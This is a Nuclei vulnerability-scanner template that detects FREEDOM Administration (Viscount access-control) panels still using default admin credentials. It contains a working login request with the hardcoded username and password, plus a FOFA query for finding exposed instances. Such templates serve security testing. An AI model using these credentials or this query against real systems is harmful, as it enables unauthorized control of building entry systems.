id: freedom-default-login

info:
  name: FREEDOM Administration - Default Login
  author: Eric Daigle,DhiyaneshDK
  severity: high
  description: |
    FREEDOM Administration contains a default admin login vulnerability. An attacker can gain unauthorized access to the administration panel, potentially accessing sensitive information, modifying system configurations, and executing unauthorized operations.
  reference:
    - https://www.ericdaigle.ca/posts/breaking-into-dozens-of-apartments-in-five-minutes/
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="FREEDOM Administration"
  tags: default-login,freedom,admin,mesh

http:
  - raw:
      - |
        POST /mesh/servlet/mesh.webadmin.MESHAdminServlet?requestedAction=login HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{RootURL}}/mesh/jsp/login.jsp

        formLoginName=freedom&formLoginPassword=viscount

    redirects: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Administration: Controlled Areas"
          - "Log Out"
        condition: and

      - type: status
        status:
          - 200
